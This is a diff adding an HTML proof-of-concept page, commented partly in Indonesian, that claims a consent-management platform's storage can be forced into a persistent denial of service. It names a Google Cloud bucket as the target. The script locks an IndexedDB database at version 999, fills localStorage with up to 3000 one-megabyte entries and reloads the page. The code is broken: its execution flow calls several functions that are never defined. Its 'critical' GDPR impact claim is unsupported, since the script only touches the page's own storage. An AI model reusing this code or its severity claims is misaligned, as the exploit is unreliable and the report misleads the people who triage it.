@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CRITICAL PoC – Persistent CMP Storage Failure</title>
+</head>
+<body>
+<h2>CRITICAL PoC: Persistent CMP Failure (IndexedDB + Storage)</h2>
+<p>Open DevTools → Console before loading.</p>
+
+<script>
+/*
+=====================================================
+REAL CONTEXT
+=====================================================
+Target bucket:
+https://storage.googleapis.com/uc-dev-tracker-declaration-config/
+
+CMP stores tracker/vendor declarations in client storage.
+Failure here breaks consent read/write → GDPR impact.
+*/
+
+/* =========================
+   PoC 1 — IndexedDB Corruption
+   ========================= */
+
+// Fungsi untuk membuka IndexedDB dengan versi tinggi untuk mengunci versi
+async function lockIndexedDBVersion() {
+  try {
+    // Membuka IndexedDB dengan versi lebih tinggi (contoh: 999)
+    const request = indexedDB.open('uc-dev-tracker-store', 999);
+
+    request.onupgradeneeded = (e) => {
+      const db = e.target.result;
+      try {
+        // Menciptakan object store baru untuk simulasi
+        db.createObjectStore('declaration-config-locked', { keyPath: 'id' });
+      } catch (err) {
+        console.error("Error on IndexedDB upgrade:", err);
+      }
+    };
+
+    request.onerror = (e) => {
+      console.error("Error opening IndexedDB:", e.target.error);
+      throw e.target.error;
+    };
+
+    request.onsuccess = () => {
+      console.log("[✓] IndexedDB terkunci pada versi 999");
+    };
+  } catch (error) {
+    console.error("Error saat penguncian versi IndexedDB:", error);
+  }
+}
+
+
+/* =========================
+   PoC 2 — Storage Quota Exhaustion
+   ========================= */
+
+function exhaustLocalStorageQuota() {
+  try {
+    // Menulis data besar ke dalam LocalStorage hingga kuota habis
+    for (let i = 0; i < 3000; i++) {
+      localStorage.setItem(
+        "ytidb::LAST_RESULT_ENTRY_KEY_" + i,
+        "X".repeat(1024 * 1024) // Menyimpan data 1MB per entry
+      );
+      console.log(`Menyimpan item ${i + 1}`);
+    }
+  } catch (e) {
+    if (e.name === "QuotaExceededError") {
+      console.error("QuotaExceededError (LocalStorage): Penyimpanan penuh", e);
+      return true;  // Mengindikasikan bahwa kuota telah habis
+    }
+    console.error("Error saat mencoba mengisi LocalStorage:", e);
+  }
+}
+
+/* =========================
+   PoC 3 — Menguji Kegagalan CMP
+   ========================= */
+
+async function testCMPFailure() {
+  try {
+    // Mencoba memuat kembali tracker atau CMP
+    const db = await normalTrackerInit();  // Memulai IndexedDB
+    const tx = db.transaction('declaration-config', 'readonly');
+    const store = tx.objectStore('declaration-config');
+    const allConfig = await store.getAll();  // Mencoba mengambil seluruh konfigurasi
+    
+    if (!allConfig) {
+      throw new Error("Gagal mengambil konfigurasi dari IndexedDB");
+    }
+
+    console.log("[✓] CMP berhasil memuat konfigurasi.");
+  } catch (e) {
+    console.error("[✖] Kegagalan CMP:", e.message);
+  }
+
+  // Menguji LocalStorage apakah penuh
+  const storageStatus = exhaustLocalStorageQuota();
+  if (storageStatus) {
+    console.log("[✖] Kuota LocalStorage telah habis, tidak dapat menyimpan persetujuan.");
+  }
+}
+
+/* =========================
+   PoC 4 — Demonstrasi DoS Persisten
+   ========================= */
+
+function demoPersistentDoS() {
+  console.log("[✖] DoS persisten: Pengguna harus menghapus data situs secara manual.");
+  console.log("Langkah-langkah:");
+  console.log("1. Buka DevTools (F12 atau Ctrl+Shift+I)");
+  console.log("2. Pilih tab 'Aplikasi' (Application)");
+  console.log("3. Di panel sebelah kiri, pilih 'IndexedDB' dan 'LocalStorage'");
+  console.log("4. Klik kanan dan pilih 'Hapus' pada entri data terkait");
+  console.log("[✓] Penghapusan data akan mengatasi DoS.");
+}
+
+
+
+
+
+/* =====================================================
+ PHASE 5 – Persistence proof (reload)
+ ===================================================== */
+
+function persistenceProof() {
+  console.log('--- RELOAD PAGE ---');
+  setTimeout(() => location.reload(), 2000);
+}
+
+/* =====================================================
+ EXECUTION FLOW
+ ===================================================== */
+
+(async function runPoC() {
+  console.log('==============================');
+  console.log(' START CMP STORAGE PoC');
+  console.log('==============================');
+
+  console.log('\n[1] Normal CMP init');
+  await openCmpDb(CMP_DB_VERSION);
+
+  console.log('\n[2] Attacker locks DB version');
+  await lockDbVersion();
+
+  console.log('\n[3] Exhaust storage');
+  exhaustStorage();
+
+  console.log('\n[4] CMP re-init failure');
+  await cmpReInit();
+
+  console.log('\n[5] Demonstrating persistence');
+  persistenceProof();
+})();
+
+</script>
+</body>
+</html>
+
